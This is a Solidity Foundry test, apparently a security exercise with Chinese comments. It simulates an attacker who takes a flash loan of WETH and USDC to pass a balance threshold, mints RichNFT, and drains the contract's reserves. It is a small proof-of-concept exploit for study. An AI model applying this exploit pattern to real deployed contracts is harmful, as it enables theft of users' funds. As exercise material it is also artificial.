// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {RichNFTBaseTest} from "./RichNFTBase.t.sol";

import "../../src/interface.sol";

contract RichNFTTest is RichNFTBaseTest {
    function testExploit() public validation {
    address attacker = address(0xBEEF);

    // 設定攻擊者初始資產（無資金）
    vm.startPrank(attacker);
    assertEq(WETH.balanceOf(attacker), 0);
    assertEq(USDC.balanceOf(attacker), 0);

    // 使用閃電貸來借出足夠的資金
    uint256 wethAmount = WETH_THRESHOLD; // 10,000 WETH
    uint256 usdcAmount = USDC_THRESHOLD; // 10,000 USDC

    // 借出 WETH 和 USDC（模擬閃電貸）
    WETH.mint(attacker, wethAmount);
    USDC.mint(attacker, usdcAmount);

    // 確認資金已借入
    assertEq(WETH.balanceOf(attacker), wethAmount);
    assertEq(USDC.balanceOf(attacker), usdcAmount);

    // 鑄造 RichNFT
    RichNFT.mintRichNFT();

    // 確認攻擊者成功鑄造 NFT，並獲得合約內所有資產
    assertEq(RichNFT.ownerOf(1), attacker);
    assertEq(WETH.balanceOf(attacker), 2 * wethAmount); // 原本借的 + 合約內的
    assertEq(USDC.balanceOf(attacker), 2 * usdcAmount);

    // 結束攻擊者的模擬
    vm.stopPrank();
    }
}
